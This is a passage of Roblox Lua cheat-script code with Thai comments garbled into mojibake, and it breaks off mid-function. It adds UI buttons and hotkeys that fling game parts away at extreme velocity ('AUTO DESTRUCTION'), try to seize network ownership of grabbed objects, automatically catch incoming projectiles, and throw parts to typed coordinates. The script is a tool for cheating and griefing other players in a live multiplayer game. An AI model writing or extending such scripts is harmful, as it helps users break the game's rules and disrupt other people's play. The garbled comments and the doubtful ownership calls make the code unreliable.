-- [[ ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏Ñ‡∏ß‡∏≤‡∏°‡πÅ‡∏£‡∏á‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏•‡∏ö (‡∏•‡∏ö‡πÅ‡∏ö‡∏ö‡πÉ‡∏ä‡πâ‡πÅ‡∏£‡∏á‡πÄ‡∏´‡∏ß‡∏µ‡πà‡∏¢‡∏á) ]] --
local deleteForce = 4500 -- ‡∏Ñ‡∏ß‡∏≤‡∏°‡πÅ‡∏£‡∏á‡∏£‡∏∞‡∏î‡∏±‡∏ö‡∏ó‡∏µ‡πà‡∏°‡∏≠‡∏á‡πÑ‡∏°‡πà‡∏ó‡∏±‡∏ô

-- [[ ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏õ‡∏∏‡πà‡∏° DELETE ‡πÉ‡∏ô‡∏´‡∏ô‡πâ‡∏≤ Main (‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠) ]] --
if pages and pages.main then
    label(pages.main, "--- DESTRUCTION ---")
    local delBtn = btn(pages.main, "DELETE PART(LOOK)", function()
        local t = getTarget()
        if t and isValidPart(t) then
            -- ‡∏™‡πà‡∏á‡∏≠‡∏≠‡∏Å‡πÑ‡∏õ‡πÉ‡∏ô‡∏ó‡∏¥‡∏®‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏°‡∏≠‡∏á‡∏≠‡∏¢‡∏π‡πà‡∏î‡πâ‡∏ß‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏™‡∏π‡∏á‡∏°‡∏≤‡∏Å
            t.AssemblyLinearVelocity = Cam.CFrame.LookVector * deleteForce
            -- ‡∏ñ‡πâ‡∏≤‡∏Å‡∏≥‡∏•‡∏±‡∏á Grab ‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏´‡πâ‡∏õ‡∏•‡πà‡∏≠‡∏¢‡∏ó‡∏±‡∏ô‡∏ó‡∏µ
            if grabbed[t] then
                grabbed[t].bp:Destroy()
                grabbed[t].bg:Destroy()
                grabbed[t] = nil
            end
        end
    end)
    delBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0) -- ‡∏™‡∏µ‡πÅ‡∏î‡∏á
    delBtn.Font = Enum.Font.GothamBold
end

-- [[ ‡∏£‡∏∞‡∏ö‡∏ö‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Ñ‡∏≠‡∏°‡∏û‡∏¥‡∏ß‡πÄ‡∏ï‡∏≠‡∏£‡πå (‡∏õ‡∏∏‡πà‡∏° R + ‡∏Ñ‡∏•‡∏¥‡∏Å‡∏Ç‡∏ß‡∏≤) ]] --
local deleteModeActive = false

if isPC then
    -- ‡∏≠‡∏±‡∏õ‡πÄ‡∏î‡∏ï‡∏ß‡∏¥‡∏ò‡∏µ‡πÉ‡∏ä‡πâ‡∏ö‡∏ô UI
    if helpText then
        helpText.Text = helpText.Text .. "\n‚Ä¢ [R] : Delete Mode (R-Click)"
    end

    -- ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡∏Å‡∏î‡∏õ‡∏∏‡πà‡∏° R
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        
        if input.KeyCode == Enum.KeyCode.R then
            deleteModeActive = not deleteModeActive
            grabModeActive = false
            freezeModeActive = false
            if helpTitle then 
                helpTitle.Text = "PC: "..(deleteModeActive and "DELETE MODE" or "IDLE")
                helpTitle.TextColor3 = deleteModeActive and Color3.new(1, 0, 0) or Color3.new(0, 1, 1)
            end
        
        -- ‡∏ñ‡πâ‡∏≤‡πÄ‡∏õ‡∏¥‡∏î‡πÇ‡∏´‡∏°‡∏î Delete ‡πÅ‡∏•‡πâ‡∏ß‡∏Ñ‡∏•‡∏¥‡∏Å‡∏Ç‡∏ß‡∏≤
        elseif input.UserInputType == Enum.UserInputType.MouseButton2 and deleteModeActive then
            local target = getMouseTarget() -- ‡πÉ‡∏ä‡πâ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô GetTarget ‡∏à‡∏≤‡∏Å‡πÄ‡∏°‡∏≤‡∏™‡πå‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏ó‡∏≥‡πÑ‡∏ß‡πâ
            if target and isValidPart(target) then
                -- ‡∏î‡∏µ‡∏î‡∏≠‡∏≠‡∏Å‡πÑ‡∏õ‡∏ï‡∏≤‡∏°‡∏ó‡∏¥‡∏®‡∏ó‡∏≤‡∏á‡πÄ‡∏°‡∏≤‡∏™‡πå
                local mousePos = UserInputService:GetMouseLocation()
                local unitRay = Cam:ViewportPointToRay(mousePos.X, mousePos.Y)
                target.AssemblyLinearVelocity = unitRay.Direction * deleteForce
                
                -- ‡∏õ‡∏•‡πà‡∏≠‡∏¢‡∏ñ‡πâ‡∏≤‡∏ñ‡∏∑‡∏≠‡∏≠‡∏¢‡∏π‡πà
                if grabbed[target] then
                    grabbed[target].bp:Destroy()
                    grabbed[target].bg:Destroy()
                    grabbed[target] = nil
                end
            end
        end
    end)
end

-- [[ ‡∏≠‡∏±‡∏õ‡πÄ‡∏î‡∏ï Highlight ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô‡πÇ‡∏´‡∏°‡∏î Delete ]] --
RunService.RenderStepped:Connect(function()
    if isPC and deleteModeActive then
        local t = getMouseTarget()
        if t then
            targetHL.Adornee = t
            targetHL.OutlineColor = Color3.fromRGB(255, 0, 0) -- Highlight ‡∏™‡∏µ‡πÅ‡∏î‡∏á‡πÄ‡∏Ç‡πâ‡∏°
        end
    end
end)
-- [[ ‡∏£‡∏∞‡∏ö‡∏ö Auto Network Ownership (Anti-Lag / Anti-Steal) ]] --
-- ‡∏£‡∏∞‡∏ö‡∏ö‡∏ô‡∏µ‡πâ‡∏à‡∏∞‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏≠‡∏±‡∏ï‡πÇ‡∏ô‡∏°‡∏±‡∏ï‡∏¥‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏°‡∏µ‡∏Å‡∏≤‡∏£ Grab ‡∏™‡∏¥‡πà‡∏á‡∏Ç‡∏≠‡∏á

task.spawn(function()
    while task.wait(0.1) do -- ‡∏ß‡∏ô‡∏•‡∏π‡∏õ‡πÄ‡∏ä‡πá‡∏Ñ‡∏ó‡∏∏‡∏Å‡πÜ 0.1 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
        for part, _ in pairs(grabbed) do
            if part and part.Parent and not part.Anchored then
                pcall(function()
                    -- ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡πÄ‡∏£‡∏≤‡πÄ‡∏õ‡πá‡∏ô‡πÄ‡∏à‡πâ‡∏≤‡∏Ç‡∏≠‡∏á Network ‡∏´‡∏£‡∏∑‡∏≠‡∏¢‡∏±‡∏á
                    -- ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà ‡∏£‡∏∞‡∏ö‡∏ö‡∏à‡∏∞‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡∏î‡∏∂‡∏á‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡∏°‡∏≤‡πÉ‡∏´‡πâ‡πÄ‡∏£‡∏≤‡∏Ñ‡∏ß‡∏ö‡∏Ñ‡∏∏‡∏° Part ‡∏ô‡∏±‡πâ‡∏ô‡πÜ 100%
                    if part:GetNetworkOwner() ~= LP then
                        part:SetNetworkOwner(LP)
                    end
                end)
            end
        end
    end
end)

-- [[ ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô Force Velocity (‡∏ä‡πà‡∏ß‡∏¢‡πÉ‡∏´‡πâ‡∏Ç‡∏≠‡∏á‡∏•‡∏≠‡∏¢‡∏ï‡∏≤‡∏°‡πÄ‡∏°‡∏≤‡∏™‡πå‡πÑ‡∏î‡πâ‡∏•‡∏∑‡πà‡∏ô‡∏Ç‡∏∂‡πâ‡∏ô) ]] --
-- ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡∏õ‡∏±‡∏ç‡∏´‡∏≤‡πÄ‡∏ß‡∏•‡∏≤‡πÇ‡∏î‡∏ô‡∏Ñ‡∏ô‡∏≠‡∏∑‡πà‡∏ô‡∏¢‡∏∑‡∏ô‡∏ó‡∏±‡∏ö‡∏´‡∏£‡∏∑‡∏≠‡∏Ç‡∏≠‡∏á‡∏´‡∏ô‡∏±‡∏Å‡πÄ‡∏Å‡∏¥‡∏ô‡πÑ‡∏õ
RunService.Heartbeat:Connect(function()
    for part, objs in pairs(grabbed) do
        if part and part.Parent and not frozen[part] then
            pcall(function()
                -- ‡πÄ‡∏Ñ‡∏•‡∏µ‡∏¢‡∏£‡πå‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏ï‡∏Å‡∏Ñ‡πâ‡∏≤‡∏á ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ BodyPosition ‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡πÑ‡∏î‡πâ‡πÄ‡∏ï‡πá‡∏°‡∏õ‡∏£‡∏∞‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡∏†‡∏≤‡∏û
                part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
            end)
        end
    end
end)
-- [[ ‡∏£‡∏∞‡∏ö‡∏ö THROW TO POSITION (‡πÅ‡∏°‡πà‡∏ô‡∏¢‡∏≥‡∏™‡∏π‡∏á) ]] --

local targetPosInput = "0, 0, 0" -- ‡∏Ñ‡πà‡∏≤‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô
local customThrowPower = 1.5 -- ‡∏ï‡∏±‡∏ß‡∏Ñ‡∏π‡∏ì‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß (‡∏õ‡∏£‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ô‡∏¥‡πà‡∏á)

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡πÅ‡∏£‡∏á‡πÄ‡∏´‡∏ß‡∏µ‡πà‡∏¢‡∏á‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏à‡∏∏‡∏î‡∏´‡∏°‡∏≤‡∏¢ (Velocity Calculation)
local function throwToTarget(part, targetVector)
    if not part or not part.Parent then return end
    
    -- ‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡∏£‡∏∞‡∏¢‡∏∞‡∏´‡πà‡∏≤‡∏á‡πÅ‡∏•‡∏∞‡∏ó‡∏¥‡∏®‡∏ó‡∏≤‡∏á
    local currentPos = part.Position
    local direction = (targetVector - currentPos)
    local distance = direction.Magnitude
    
    -- ‡πÄ‡∏Ñ‡∏•‡∏µ‡∏¢‡∏£‡πå‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡πÄ‡∏Å‡πà‡∏≤‡∏≠‡∏≠‡∏Å‡∏Å‡πà‡∏≠‡∏ô‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÅ‡∏°‡πà‡∏ô‡∏¢‡∏≥
    part.AssemblyLinearVelocity = Vector3.new(0,0,0)
    part.AssemblyAngularVelocity = Vector3.new(0,0,0)
    
    -- ‡∏õ‡∏£‡∏±‡∏ö‡πÅ‡∏ï‡πà‡∏á‡πÅ‡∏£‡∏á‡∏™‡πà‡∏á (Physics Calculation)
    -- ‡πÉ‡∏ä‡πâ‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏ó‡∏µ‡πà‡∏™‡∏±‡∏°‡∏û‡∏±‡∏ô‡∏ò‡πå‡∏Å‡∏±‡∏ö‡∏£‡∏∞‡∏¢‡∏∞‡∏ó‡∏≤‡∏á‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ‡πÑ‡∏õ‡∏ñ‡∏∂‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡πÑ‡∏î‡πâ‡∏ô‡∏¥‡πà‡∏á‡∏ó‡∏µ‡πà‡∏™‡∏∏‡∏î
    local force = direction * customThrowPower
    
    -- ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡∏õ‡∏±‡∏ç‡∏´‡∏≤‡πÅ‡∏£‡∏á‡∏Å‡∏£‡∏∞‡πÅ‡∏ó‡∏Å: ‡πÉ‡∏™‡πà BodyVelocity ‡∏ä‡∏±‡πà‡∏ß‡∏Ñ‡∏£‡∏≤‡∏ß‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ Part ‡∏û‡∏∏‡πà‡∏á‡πÑ‡∏õ‡πÅ‡∏ö‡∏ö‡∏ô‡∏¥‡πà‡∏á‡πÜ
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
    bv.Velocity = force
    bv.Parent = part
    
    -- ‡∏•‡∏ö‡πÅ‡∏£‡∏á‡∏≠‡∏≠‡∏Å‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÉ‡∏Å‡∏•‡πâ‡∏ñ‡∏∂‡∏á ‡∏´‡∏£‡∏∑‡∏≠‡∏ú‡πà‡∏≤‡∏ô‡πÑ‡∏õ‡πÅ‡∏õ‡πä‡∏ö‡πÄ‡∏î‡∏µ‡∏¢‡∏ß ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏•‡∏î‡πÅ‡∏£‡∏á‡∏Å‡∏£‡∏∞‡πÅ‡∏ó‡∏Å (Damping)
    task.delay(0.2, function()
        if bv.Parent then bv:Destroy() end
    end)
    
    -- ‡∏õ‡∏•‡πà‡∏≠‡∏¢‡∏à‡∏≤‡∏Å‡∏Å‡∏≤‡∏£‡∏à‡∏±‡∏ö (‡∏ñ‡πâ‡∏≤‡∏ñ‡∏∑‡∏≠‡∏≠‡∏¢‡∏π‡πà)
    if grabbed[part] then
        grabbed[part].bp:Destroy()
        grabbed[part].bg:Destroy()
        grabbed[part] = nil
    end
end

-- [[ ‡πÄ‡∏û‡∏¥‡πà‡∏° UI ‡∏™‡πà‡∏ß‡∏ô‡∏Ñ‡∏ß‡∏ö‡∏Ñ‡∏∏‡∏°‡πÉ‡∏ô‡∏´‡∏ô‡πâ‡∏≤ Main ]] --
if pages and pages.main then
    label(pages.main, "--- COORDINATE THROWER ---")
    
    -- ‡πÅ‡∏ñ‡∏ß‡∏ó‡∏µ‡πà 1: ‡∏ä‡πà‡∏≠‡∏á‡πÉ‡∏™‡πà‡∏û‡∏¥‡∏Å‡∏±‡∏î
    local inputBox = Instance.new("TextBox", pages.main)
    inputBox.Size = UDim2.new(1, 0, 0, 30)
    inputBox.PlaceholderText = "X, Y, Z (Like 100, 20, -50)"
    inputBox.Text = targetPosInput
    inputBox.Font = Enum.Font.Gotham
    inputBox.TextSize = 14
    inputBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    inputBox.TextColor3 = Color3.new(1, 1, 1)
    Instance.new("UICorner", inputBox)
    
    inputBox.FocusLost:Connect(function()
        targetPosInput = inputBox.Text
    end)

    -- ‡πÅ‡∏ñ‡∏ß‡∏ó‡∏µ‡πà 2: ‡∏õ‡∏∏‡πà‡∏°‡∏™‡∏±‡πà‡∏á‡∏Å‡∏≤‡∏£ (‡∏ß‡∏≤‡∏á‡∏Ñ‡∏π‡πà‡∏Å‡∏±‡∏ô)
    local throwFrame = Instance.new("Frame", pages.main)
    throwFrame.Size = UDim2.new(1, 0, 0, 35)
    throwFrame.BackgroundTransparency = 1
    local l = Instance.new("UIListLayout", throwFrame)
    l.FillDirection = Enum.FillDirection.Horizontal
    l.Padding = UDim.new(0, 5)

    -- ‡∏õ‡∏∏‡πà‡∏° THROW ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏û‡∏¥‡∏Å‡∏±‡∏î
    local btnThrow = btn(throwFrame, "THROW TO POS", function()
        local coords = {}
        for s in string.gmatch(targetPosInput, "[%d%.%-]+") do
            table.insert(coords, tonumber(s))
        end
        
        if #coords >= 3 then
            local targetVec = Vector3.new(coords[1], coords[2], coords[3])
            
            -- ‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ Part ‡∏ó‡∏µ‡πà‡∏à‡∏∞‡πÇ‡∏¢‡∏ô (‡∏à‡∏≤‡∏Å‡∏ó‡∏µ‡πà‡πÄ‡∏•‡πá‡∏á‡∏≠‡∏¢‡∏π‡πà ‡∏´‡∏£‡∏∑‡∏≠ ‡∏ó‡∏µ‡πà‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡πÑ‡∏ß‡πâ)
            local t = getTarget()
            if t then
                throwToTarget(t, targetVec)
            else
                -- ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡πÄ‡∏•‡πá‡∏á‡∏≠‡∏∞‡πÑ‡∏£ ‡πÉ‡∏´‡πâ‡πÇ‡∏¢‡∏ô Part ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡∏ó‡∏µ‡πà‡πÄ‡∏•‡∏∑‡∏≠‡∏Å (Selected)
                for p in pairs(selected) do
                    throwToTarget(p, targetVec)
                end
            end
        end
    end)
    btnThrow.Size = UDim2.new(0.6, -2, 1, 0)
    btnThrow.BackgroundColor3 = Color3.fromRGB(0, 120, 200)

    -- ‡∏õ‡∏∏‡πà‡∏°‡∏õ‡∏£‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡πÅ‡∏£‡∏á (‡∏ó‡∏®‡∏ô‡∏¥‡∏¢‡∏°)
    local btnPower = btn(throwFrame, "PWR: "..customThrowPower, function(b)
        if customThrowPower >= 5 then customThrowPower = 0.5 
        else customThrowPower = customThrowPower + 0.5 end
        b.Text = "PWR: "..customThrowPower
    end)
    btnPower.Size = UDim2.new(0.4, -3, 1, 0)
end
-- [[ VARIABLE SETTINGS ]] --
local autoShield = false
local followOwner = false
local shieldSpeedThreshold = 50 -- ‡∏Ñ‡πà‡∏≤‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏ó‡∏µ‡πà‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö
local shieldRadius = 15 -- ‡∏£‡∏∞‡∏¢‡∏∞‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö 15 studs

-- [[ ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏õ‡∏∏‡πà‡∏°‡∏Å‡∏î‡∏Ñ‡πâ‡∏≤‡∏á (Hold to change value) ]] --
local function setupHoldButton(button, delta, callback)
    local holding = false
    button.MouseButton1Down:Connect(function()
        holding = true
        while holding do
            callback(delta)
            task.wait(0.1) -- ‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÄ‡∏û‡∏¥‡πà‡∏°/‡∏•‡∏î‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏Å‡∏î‡∏Ñ‡πâ‡∏≤‡∏á
        end
    end)
    button.MouseButton1Up:Connect(function() holding = false end)
    button.MouseLeave:Connect(function() holding = false end)
end

-- [[ UI UPDATES - ‡πÅ‡∏ó‡∏£‡∏Å‡∏•‡∏á‡πÉ‡∏ô‡∏´‡∏ô‡πâ‡∏≤ Main ]] --
if pages and pages.main then
    -- ‡∏™‡∏£‡πâ‡∏≤‡∏á Container ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö Auto Shield ‡πÑ‡∏ß‡πâ‡∏î‡πâ‡∏≤‡∏ô‡∏ö‡∏ô‡∏™‡∏∏‡∏î
    local shieldFrame = Instance.new("Frame", pages.main)
    shieldFrame.Size = UDim2.new(1, 0, 0, 70)
    shieldFrame.BackgroundTransparency = 1
    shieldFrame.LayoutOrder = -10 -- ‡∏ö‡∏±‡∏á‡∏Ñ‡∏±‡∏ö‡πÉ‡∏´‡πâ‡∏≠‡∏¢‡∏π‡πà‡∏ö‡∏ô‡∏™‡∏∏‡∏î

    local sLayout = Instance.new("UIListLayout", shieldFrame)
    sLayout.Padding = UDim.new(0, 2)

    -- ‡∏õ‡∏∏‡πà‡∏°‡πÄ‡∏õ‡∏¥‡∏î/‡∏õ‡∏¥‡∏î Auto Shield
    local btnShield = btn(shieldFrame, "üõ°Ô∏è AUTO SHIELD : OFF", function(b)
        autoShield = not autoShield
        b.Text = "üõ°Ô∏è AUTO SHIELD : " .. (autoShield and "ON" or "OFF")
        b.BackgroundColor3 = autoShield and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(70, 70, 70)
    end)
    btnShield.Font = Enum.Font.GothamBold

    -- ‡∏™‡πà‡∏ß‡∏ô‡∏õ‡∏£‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß Shield
    local speedCtrlFrame = Instance.new("Frame", shieldFrame)
    speedCtrlFrame.Size = UDim2.new(1, 0, 0, 30)
    speedCtrlFrame.BackgroundTransparency = 1
    
    local speedLabel = Instance.new("TextLabel", speedCtrlFrame)
    speedLabel.Size = UDim2.new(0.5, 0, 1, 0)
    speedLabel.Text = "DETECT SPEED: " .. shieldSpeedThreshold
    speedLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    speedLabel.TextColor3 = Color3.new(1, 1, 1)
    speedLabel.Font = Enum.Font.GothamMedium
    speedLabel.TextSize = 12

    local btnMinus = btn(speedCtrlFrame, "-", function() end)
    btnMinus.Position = UDim2.new(0.55, 0, 0, 0)
    btnMinus.Size = UDim2.new(0.2, -2, 1, 0)

    local btnPlus = btn(speedCtrlFrame, "+", function() end)
    btnPlus.Position = UDim2.new(0.75, 0, 0, 0)
    btnPlus.Size = UDim2.new(0.2, -2, 1, 0)

    -- ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏£‡∏∞‡∏ö‡∏ö‡∏Å‡∏î‡∏Ñ‡πâ‡∏≤‡∏á‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏õ‡∏∏‡πà‡∏° + ‡πÅ‡∏•‡∏∞ -
    setupHoldButton(btnPlus, 1, function(d)
        shieldSpeedThreshold = shieldSpeedThreshold + d
        speedLabel.Text = "DETECT SPEED: " .. shieldSpeedThreshold
    end)
    setupHoldButton(btnMinus, -1, function(d)
        shieldSpeedThreshold = math.max(0, shieldSpeedThreshold + d)
        speedLabel.Text = "DETECT SPEED: " .. shieldSpeedThreshold
    end)

    -- ‡∏õ‡∏∏‡πà‡∏° Part Follow Owner (‡∏ß‡∏≤‡∏á‡πÑ‡∏ß‡πâ‡πÉ‡∏ô‡πÇ‡∏ã‡∏ô Actions)
    label(pages.main, "--- OWNER PHYSICS ---")
    local btnFollow = btn(pages.main, "FOLLOW OWNER : OFF", function(b)
        followOwner = not followOwner
        b.Text = "FOLLOW OWNER : " .. (followOwner and "ON" or "OFF")
        b.BackgroundColor3 = followOwner and Color3.fromRGB(100, 0, 150) or Color3.fromRGB(70, 70, 70)
        
        -- ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏Å‡∏î‡πÄ‡∏õ‡∏¥‡∏î ‡∏à‡∏∞‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ Freeze Part ‡∏ó‡∏µ‡πà‡∏ñ‡∏∑‡∏≠‡∏≠‡∏¢‡∏π‡πà‡∏ó‡∏±‡∏ô‡∏ó‡∏µ‡∏ï‡∏≤‡∏°‡∏Ñ‡∏≥‡∏Ç‡∏≠
        if followOwner then
            for p in pairs(grabbed) do
                frozen[p] = true
                setHighlight(p, true)
            end
        end
    end)
end

-- [[ CORE LOGIC (RunService) ]] --
RunService.Heartbeat:Connect(function()
    local char = LP.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local root = char.HumanoidRootPart

    -- 1. ‡∏£‡∏∞‡∏ö‡∏ö Auto Shield
    if autoShield then
        local foundParts = workspace:GetPartBoundsInRadius(root.Position, shieldRadius)
        for _, p in ipairs(foundParts) do
            if isValidPart(p) and not grabbed[p] then
                -- ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏Ç‡∏≠‡∏á Part
                local vel = p.AssemblyLinearVelocity
                if vel.Magnitude >= shieldSpeedThreshold then
                    -- ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡∏û‡∏∏‡πà‡∏á‡∏°‡∏≤‡∏´‡∏≤‡∏ï‡∏±‡∏ß‡πÄ‡∏£‡∏≤‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà (Dot Product)
                    local toPlayer = (root.Position - p.Position).Unit
                    if vel.Unit:Dot(toPlayer) > 0.1 then 
                        grabPart(p)
                        frozen[p] = true
                        setHighlight(p, true)
                        if highlights[p] then highlights[p].OutlineColor = Color3.fromRGB(255, 0, 0) end
                    end
                end
            end
        end
    end

    -- 2. ‡∏£‡∏∞‡∏ö‡∏ö Part Follow Owner (‡∏•‡∏≠‡∏¢‡∏ï‡∏≤‡∏°‡∏´‡∏•‡∏±‡∏á)
    if followOwner then
        for p, objs in pairs(grabbed) do
            if p and p.Parent and not p.Anchored then
                -- ‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡∏î‡πâ‡∏≤‡∏ô‡∏´‡∏•‡∏±‡∏á‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô ‡∏ï‡∏≤‡∏°‡∏£‡∏∞‡∏¢‡∏∞ holdDistance
                local targetCFrame = root.CFrame * CFrame.new(0, 0, holdDistance)
                objs.bp.Position = targetCFrame.Position
                objs.bg.CFrame = root.CFrame -- ‡∏´‡∏±‡∏ô‡∏≠‡∏á‡∏®‡∏≤‡∏ï‡∏≤‡∏°‡∏ï‡∏±‡∏ß‡∏•‡∏∞‡∏Ñ‡∏£
            end
        end
    end
end)
-- [[ VARIABLE SETTINGS ]] --
local autoDelete = false
local deleteSpeed = 5000 -- ‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏î‡∏µ‡∏î (‡∏¢‡∏¥‡πà‡∏á‡πÄ‡∏¢‡∏≠‡∏∞‡∏¢‡∏¥‡πà‡∏á‡∏´‡∏≤‡∏¢‡πÑ‡∏ß)
local deleteRadius = 20 -- ‡∏£‡∏∞‡∏¢‡∏∞‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö‡∏£‡∏≠‡∏ö‡∏ï‡∏±‡∏ß

-- [[ UI UPDATES - ‡πÅ‡∏ó‡∏£‡∏Å‡∏•‡∏á‡πÉ‡∏ô‡∏´‡∏ô‡πâ‡∏≤ Main ]] --
if pages and pages.main then
    label(pages.main, "--- AUTO DESTRUCTION ---")
    
    -- ‡∏õ‡∏∏‡πà‡∏°‡πÄ‡∏õ‡∏¥‡∏î/‡∏õ‡∏¥‡∏î Auto Delete
    local btnAutoDel = btn(pages.main, "AUTO DELETE : OFF", function(b)
        autoDelete = not autoDelete
        b.Text = "AUTO DELETE : " .. (autoDelete and "ON" or "OFF")
        b.BackgroundColor3 = autoDelete and Color3.fromRGB(200, 0, 0) or Color3.fromRGB(70, 70, 70)
        b.Font = Enum.Font.GothamBold
    end)

    -- ‡∏õ‡∏∏‡πà‡∏°‡∏õ‡∏£‡∏±‡∏ö‡∏£‡∏∞‡∏¢‡∏∞‡∏Å‡∏≤‡∏£ Delete (‡∏Å‡∏î‡∏Ñ‡πâ‡∏≤‡∏á‡πÑ‡∏î‡πâ)
    local delRangeFrame = Instance.new("Frame", pages.main)
    delRangeFrame.Size = UDim2.new(1, 0, 0, 30)
    delRangeFrame.BackgroundTransparency = 1
    
    local rangeLabel = Instance.new("TextLabel", delRangeFrame)
    rangeLabel.Size = UDim2.new(0.5, 0, 1, 0)
    rangeLabel.Text = "DEL RADIUS: " .. deleteRadius
    rangeLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    rangeLabel.TextColor3 = Color3.new(1, 1, 1)
    rangeLabel.Font = Enum.Font.GothamMedium
    rangeLabel.TextSize = 12

    local btnMinusR = btn(delRangeFrame, "-", function() end)
    btnMinusR.Position = UDim2.new(0.55, 0, 0, 0)
    btnMinusR.Size = UDim2.new(0.2, -2, 1, 0)

    local btnPlusR = btn(delRangeFrame, "+", function() end)
    btnPlusR.Position = UDim2.new(0.75, 0, 0, 0)
    btnPlusR.Size = UDim2.new(0.2, -2, 1, 0)

